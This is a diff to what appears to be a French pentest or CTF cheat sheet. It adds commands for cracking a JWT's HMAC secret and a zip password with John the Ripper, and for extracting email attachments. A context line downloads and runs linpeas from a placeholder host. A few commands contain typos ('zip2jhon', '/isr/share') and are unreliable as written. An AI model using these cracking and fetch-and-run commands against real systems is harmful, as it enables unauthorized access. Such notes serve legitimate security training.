@@ -32,6 +32,14 @@ user2:hash2
 
 ```
 
+jwt en sha256
+```
+cat > /tmp/hash << EOF
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6MCwiZXhwIjoxNzI4ODA5ODM2fQ.wcMEZhrZRprqy8-a2fC2sbvsWrNUBcj3gpf9epyssck
+EOF
+john /tmp/hash --format=HMAC-SHA256
+```
+
 ## hashcat
 
 ```
@@ -92,3 +100,20 @@ wget -O linpeas.sh http://ip_machine:8081/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
+
+# emlAnalyzer
+
+`emlAnalyzer -i mail_file`  
+Extraire une pj
+`emlAnalyzer -i mail_file -ea 1`
+
+# zip2jhon
+
+zip protegé par un mdp
+
+```
+zip2jhon secret.zip > hashzip
+john --wordlist=/isr/share/wordlists/rockyou.txt hashzip
+```
+
+`unzip secret.zip`
